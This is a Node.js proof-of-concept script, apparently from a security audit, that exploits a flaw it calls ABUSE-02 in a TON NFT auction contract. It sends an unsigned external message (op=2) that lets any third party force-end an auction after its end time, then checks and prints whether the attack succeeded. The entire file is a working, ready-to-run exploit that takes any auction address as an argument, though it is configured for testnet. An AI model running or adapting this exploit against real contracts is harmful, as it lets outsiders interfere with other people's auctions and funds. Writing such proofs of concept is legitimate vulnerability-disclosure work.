/**
 * poc-abuse02-end-auction.js
 *
 * ABUSE-02: anyone can call recv_external(op=2) on an active auction
 * after end_time passes. No wallet key needed — pure external message.
 *
 * Usage: node poc-abuse02-end-auction.js <auction_address>
 *
 * Requirements:
 *   - Auction must be activated (NFT transferred to it)
 *   - now() >= end_time
 *   - end? == false (not already ended)
 *   - balance >= 0.5 TON (for gas accept)
 */

const { TonClient, Address, beginCell } = require('./nft-contracts/node_modules/@ton/ton');
const { external, storeMessage } = require('./nft-contracts/node_modules/@ton/core');

const AUCTION_ADDR = process.argv[2];
if (!AUCTION_ADDR) {
  console.error('Usage: node poc-abuse02-end-auction.js <auction_address>');
  process.exit(1);
}

const client = new TonClient({
  endpoint: 'https://testnet.toncenter.com/api/v2/jsonRPC',
  apiKey: '',
});

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function fmt(n) { return (Number(n) / 1e9).toFixed(6); }

async function withRetry(fn, max = 6) {
  for (let i = 1; i <= max; i++) {
    try { return await fn(); }
    catch (e) {
      if (i < max) { await sleep(e.message?.includes('429') ? 2500 * i : 1200); continue; }
      throw e;
    }
  }
}

async function getAuctionState(addr) {
  try {
    const r = await withRetry(() => client.runMethod(addr, 'get_auction_data'));
    // returns: activated, end, end_time, mp_addr, nft_addr, nft_owner, last_bid, ...
    const activated = r.stack.readNumber();
    const end       = r.stack.readNumber();
    const end_time  = r.stack.readNumber();
    r.stack.readCell(); // mp_addr
    r.stack.readCell(); // nft_addr
    r.stack.readCell(); // nft_owner
    const last_bid  = r.stack.readBigNumber();
    return { is_canceled: 0, end, activated, last_bid, end_time };
  } catch (e) { return { error: e.message }; }
}

async function main() {
  const addr = Address.parse(AUCTION_ADDR);
  console.log('╔══════════════════════════════════════════════════════════════╗');
  console.log('║  ABUSE-02 PoC — Force-end auction via recv_external(op=2)   ║');
  console.log('╚══════════════════════════════════════════════════════════════╝\n');
  console.log('Target auction:', addr.toString({ testOnly: true, bounceable: true }));

  // ── Check state before ─────────────────────────────────────────────────────
  const st = await withRetry(() => client.getContractState(addr));
  const bal = BigInt(st.balance || '0');
  console.log('Balance:', fmt(bal), 'TON');

  const data = await getAuctionState(addr);
  if (data.error) { console.error('get_sale_data error:', data.error); process.exit(1); }

  const now = Math.floor(Date.now() / 1000);
  console.log('\n── Auction state ──');
  console.log('activated:', data.activated !== 0 ? '✅' : '❌');
  console.log('end?:      ', data.end !== 0 ? 'already ended' : '❌ not yet');
  console.log('end_time:  ', new Date(data.end_time * 1000).toISOString());
  console.log('now():     ', new Date(now * 1000).toISOString());
  console.log('can_end:   ', now >= data.end_time ? '✅ YES' : '❌ NO — ' + (data.end_time - now) + 's remaining');
  console.log('last_bid:  ', fmt(data.last_bid), 'TON');

  if (data.activated === 0) {
    console.error('\nAuction not activated yet (NFT not transferred). Wait.');
    process.exit(1);
  }
  if (data.end !== 0) {
    console.error('\nAuction already ended.');
    process.exit(1);
  }
  if (now < data.end_time) {
    const remaining = data.end_time - now;
    console.log(`\nAuction still running. Waiting ${remaining}s until end_time...`);
    let left = remaining + 2;
    while (left > 0) {
      const tick = Math.min(10, left);
      await sleep(tick * 1000);
      left -= tick;
      if (left > 0) process.stdout.write(`\r  ...${left}s remaining     `);
    }
    console.log('\n  end_time passed, proceeding.');
  }

  // ── Send recv_external(op=2) ────────────────────────────────────────────────
  console.log('\n── Sending recv_external(op=2) — no wallet needed ──');
  const body = beginCell().storeUint(2, 32).endCell();
  const extMsg = external({ to: addr, init: null, body });
  const boc = beginCell().store(storeMessage(extMsg)).endCell().toBoc();

  await withRetry(() => client.sendFile(boc));
  console.log('External message sent. Waiting 20s...');
  await sleep(20000);

  // ── Verify ─────────────────────────────────────────────────────────────────
  const after = await getAuctionState(addr);
  const stAfter = await withRetry(() => client.getContractState(addr));

  console.log('\n╔══════════════════════════════════════════════════════════════╗');
  console.log('║  RESULT                                                      ║');
  console.log('╠══════════════════════════════════════════════════════════════╣');
  if (after.error) {
    console.log('║  get_sale_data error (contract may be empty): ' + after.error.substring(0,14).padEnd(14) + '║');
  } else {
    console.log('║  end?:    ' + (after.end !== 0 ? '✅ true — auction finalized' : '❌ false').padEnd(49) + '║');
    console.log('║  balance: ' + fmt(BigInt(stAfter.balance || '0')).padEnd(49) + '║');
  }
  const abuse02 = !after.error && after.end !== 0;
  console.log('╠══════════════════════════════════════════════════════════════╣');
  console.log('║  ABUSE-02: ' + (abuse02
    ? '✅ CONFIRMED — third party ended auction'
    : '❌ not triggered').padEnd(48) + '║');
  console.log('╚══════════════════════════════════════════════════════════════╝');
  console.log('\nTonscan:', 'https://testnet.tonscan.org/address/' + addr.toRawString());
}

main().catch(e => { console.error('FATAL:', e.message); process.exit(1); });
